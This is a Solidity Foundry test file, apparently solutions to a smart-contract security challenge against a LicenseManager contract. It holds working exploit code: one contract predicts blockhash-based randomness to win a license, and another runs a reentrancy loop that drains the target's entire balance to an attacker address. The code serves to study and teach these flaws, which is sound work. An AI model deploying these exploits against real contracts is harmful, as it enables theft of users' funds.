// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/LicenseManager.sol";

// Calculates if the attacker would be able to successfully get a licence if it would call the `winLicense` function in this `blockNumber`.
contract AttackContract1 {
    function canGetLicence(uint blockNumber) public payable returns (bool) {
        uint algorithm = uint(
            keccak256(
                abi.encodePacked(
                    uint256(0.01 ether),
                    msg.sender,
                    uint(1337),
                    blockhash(blockNumber - 1)
                )
            )
        );
        uint pickedNumber = algorithm % 100;
        if (pickedNumber < 1) {
            return true;
        } else {
            return false;
        }
    }
}

contract AttackContract2 {
    LicenseManager licenceManager;
    address attacker;

    constructor(LicenseManager _licenceManager, address _attacker) {
        licenceManager = _licenceManager;
        attacker = _attacker;
    }

    function buyLicense() public payable {
        licenceManager.buyLicense{value: msg.value}();
    }

    function refundLicense() public payable {
        licenceManager.refundLicense();
        // Send stolen funds to attacker
        (bool success, ) = attacker.call{value: address(this).balance}("");
        require(success);
    }

    // Reentrancy attack; Draining the complete balance of the licenceManager contract
    receive() external payable {
        while (address(licenceManager).balance > 0) {
            licenceManager.refundLicense();
        }
    }
}

/**
 * @title Test contract for LicenseManager
 */
contract LicenseManagerTest is Test {
    LicenseManager license;
    AttackContract1 attackContract1;
    AttackContract2 attackContract2;

    address owner = makeAddr("owner");
    address user1 = makeAddr("user1");
    address user2 = makeAddr("user2");
    address user3 = makeAddr("user3");
    address user4 = makeAddr("user4");

    address attacker = makeAddr("attacker");

    receive() external payable {}

    function setUp() public {
        vm.prank(owner);
        license = new LicenseManager();

        vm.deal(user1, 1 ether);
        vm.deal(user2, 1 ether);
        vm.deal(user3, 1 ether);
        vm.deal(user4, 1 ether);

        vm.prank(user1);
        license.buyLicense{value: 1 ether}();

        vm.prank(user2);
        license.buyLicense{value: 1 ether}();

        vm.prank(user3);
        license.buyLicense{value: 1 ether}();

        vm.prank(user4);
        license.buyLicense{value: 1 ether}();
    }

    function test_exploit1_2() public {
        vm.deal(attacker, 0.01 ether);
        vm.startPrank(attacker);

        // Challenge 1 solution

        attackContract1 = new AttackContract1();

        // Every time a new block is created, the `attacker` checks with the function `canGetLicence` if it would be able to win a licence in the next block.
        for (
            uint nextBlockNumber = 1;
            nextBlockNumber < 200;
            nextBlockNumber++
        ) {
            // We set the nextBlockNumber
            vm.roll(nextBlockNumber);

            bool canGetLicence = attackContract1.canGetLicence(nextBlockNumber);

            // If `attacker` can get a licence, it immediatly calls the `winLicence` function (so that its transaction ends up in the next block created)
            if (canGetLicence == true) {
                license.winLicense{value: 0.01 ether}();
                break;
            }
        }

        assertEq(true, license.checkLicense());
        vm.stopPrank();

        vm.startPrank(attacker);

        // Challenge 2.1 solution

        license.refundLicense();

        assertGt(attacker.balance, 0.1 ether);
        vm.stopPrank();
    }

    /// Collect the ethers in the contract before the owner notices in a second way.
    function test_exploit3() public {
        vm.deal(address(this), 1 ether);

        // Challenge 2.2 solution

        attackContract2 = new AttackContract2(
            LicenseManager(license),
            address(this)
        );
        attackContract2.buyLicense{value: 1 ether}();
        attackContract2.refundLicense();

        console.log("\tFinal Balance\t", address(this).balance);
        assertGt(address(this).balance, 1 ether);
    }
}
